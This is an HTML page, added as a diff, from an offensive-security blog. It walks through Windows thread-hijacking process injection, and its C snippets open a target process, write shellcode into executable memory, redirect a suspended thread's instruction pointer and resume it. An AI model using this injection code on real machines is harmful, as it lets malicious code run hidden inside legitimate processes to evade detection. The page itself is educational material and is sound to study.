@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Thread Injection - Husam Gameel | Oppenheim3r</title>
+    <meta name="description" content="Learn about thread hijacking techniques in Windows process injection, a post-exploitation technique for evasion, privilege escalation, and persistence.">
+    
+    <link rel="stylesheet" href="../../assets/css/styles.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <!-- Floating Binaries Background -->
+    <div class="floating-binaries" id="floating-binaries"></div>
+    
+    <!-- Spider Web Overlay -->
+    <div class="spider-web" id="spider-web">
+        <div class="web-line" style="top: 20%; left: 0; width: 100%;"></div>
+        <div class="web-line" style="top: 40%; left: 0; width: 100%;"></div>
+        <div class="web-line" style="top: 60%; left: 0; width: 100%;"></div>
+        <div class="web-line" style="top: 80%; left: 0; width: 100%;"></div>
+        <div class="web-line vertical" style="left: 15%; top: 0;"></div>
+        <div class="web-line vertical" style="left: 35%; top: 0;"></div>
+        <div class="web-line vertical" style="left: 55%; top: 0;"></div>
+        <div class="web-line vertical" style="left: 75%; top: 0;"></div>
+        <div class="web-line vertical" style="left: 85%; top: 0;"></div>
+    </div>
+
+    <div class="container">
+        <!-- Header -->
+        <header class="header">
+            <div class="header-content">
+                <div class="logo">
+                    <h1>Oppenheim3r</h1>
+                    <p>Husam Gameel</p>
+                </div>
+                <nav class="nav">
+                    <a href="/" class="nav-btn">
+                        <i class="fas fa-home"></i>
+                        Home
+                    </a>
+                    <a href="/about/" class="nav-btn">
+                        <i class="fas fa-user"></i>
+                        About
+                    </a>
+                    <a href="/blogs/" class="nav-btn">
+                        <i class="fas fa-blog"></i>
+                        All Blogs
+                    </a>
+                    <a href="/blogs/offensive/" class="nav-btn active">
+                        <i class="fas fa-sword"></i>
+                        Offensive
+                    </a>
+                    <a href="/blogs/defensive/" class="nav-btn">
+                        <i class="fas fa-shield-alt"></i>
+                        Defensive
+                    </a>
+                    <a href="/research/" class="nav-btn">
+                        <i class="fas fa-flask"></i>
+                        Research
+                    </a>
+                </nav>
+            </div>
+        </header>
+
+        <!-- Breadcrumb -->
+        <div class="breadcrumb" id="breadcrumb">
+            <a href="/">Home</a> <span class="breadcrumb-separator">></span> 
+            <a href="/blogs/">Blogs</a> <span class="breadcrumb-separator">></span> 
+            <a href="/blogs/offensive/">Offensive</a> <span class="breadcrumb-separator">></span> 
+            <span>Thread Injection</span>
+        </div>
+
+        <!-- Main Content -->
+        <main class="main">
+            <div class="article-content">
+                <a href="/blogs/offensive/" class="back-btn">
+                    <i class="fas fa-arrow-left"></i>
+                    Back to Offensive Security
+                </a>
+                
+                <h1>Thread Injection - Windows Process Injection Technique</h1>
+                <div class="post-meta" style="margin-bottom: 2rem;">
+                    <span class="post-category">Offensive Security</span>
+                    <span>June 12, 2023</span>
+                </div>
+
+                <p>This post will be an explanation of how to perform thread hijacking on Windows, one type of Process injection techniques that can be used in post-exploitation for evasion, privilege escalation, persistence, etc. It's going to be explained as threads.</p>
+
+                <p>We will need first to locate and open a process, allocate memory region for our code, write code on the allocated memory, and identify the thread ID to hijack.</p>
+
+                <h2>Initial Setup</h2>
+                <p>First, we need to open a target process and allocate memory for our shellcode:</p>
+
+                <pre><code>HANDLE h_Process = OpenProcess(PROCESS_ALL_ACCESS,FALSE,atoi(argv[1]));
+
+PVOID remoteBuffer = VirtualAllocEx(h_Process,NULL,
+sizeof shellcode,MEM_RESERVE | MEM_COMMIT,
+PAGE_EXECUTE_READWRITE);
+
+WriteProcessMemory(h_Process,remoteBuffer,shellcode,sizeof shellcode,	NULL);
+
+// will loop through the process thread then identify the thread ID of the process we want 
+HANDLE proc_snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+Thread32First(	proc_snap,	&threadentery);
+
+while (Thread32Next(proc_snap, &threadentery)) {
+	if (threadentery.th32OwnerProcessID == atoi(argv[1])) {
+		h_thread = OpenThread(	THREAD_ALL_ACCESS,
+FALSE,threadentery.th32ThreadID);
+	break;}
+}</code></pre>
+
+                <h2>Thread Hijacking Process</h2>
+                <p>Then we need to:</p>
+                <ol>
+                    <li>Suspend the target thread</li>
+                    <li>Get its context to use it in our API call</li>
+                </ol>
+
+                <pre><code>SuspendThread(h_thread);
+
+GetThreadContext(
+	h_thread,
+	&ctx
+);</code></pre>
+
+                <h2>Modifying Thread Context</h2>
+                <p>After we get its context, we need to write on the RIP Instruction Pointer Register, which is responsible for determining the next code instruction. So we update it to point to our shellcode in memory, and we need to update the thread context since we updated it.</p>
+
+                <pre><code>ctx.Rip = (DWORD_PTR)remoteBuffer;
+SetThreadContext(h_thread, &ctx);</code></pre>
+
+                <h2>Resuming Execution</h2>
+                <p>Finally, we resume the thread from the suspending state:</p>
+
+                <pre><code>ResumeThread(h_thread);</code></pre>
+
+                <h2>Conclusion</h2>
+                <p>Now we have hijacked the thread and this can be leveraged for more evasion techniques. Thread injection is a powerful technique that allows attackers to execute malicious code within the context of a legitimate process, making detection more difficult.</p>
+
+                <div class="article-footer" style="margin-top: 3rem; padding-top: 2rem; border-top: 1px solid var(--border-color);">
+                    <p style="color: var(--text-muted); font-size: 0.9rem;">
+                        <strong>Disclaimer:</strong> This content is for educational purposes only. The techniques described should only be used in authorized penetration testing and security research environments.
+                    </p>
+                </div>
+            </div>
+        </main>
+
+        <!-- Footer -->
+        <footer class="footer">
+            <div class="footer-content">
+                <p>&copy; 2025 Husam Gameel (Oppenheim3r). All rights reserved.</p>
+                <div class="social-links">
+                    <a href="#" class="social-link" title="GitHub"><i class="fab fa-github"></i></a>
+                    <a href="#" class="social-link" title="LinkedIn"><i class="fab fa-linkedin"></i></a>
+                    <a href="#" class="social-link" title="Twitter"><i class="fab fa-twitter"></i></a>
+                    <a href="#" class="social-link" title="Email"><i class="fas fa-envelope"></i></a>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <script src="../../assets/js/main.js"></script>
+</body>
+</html>
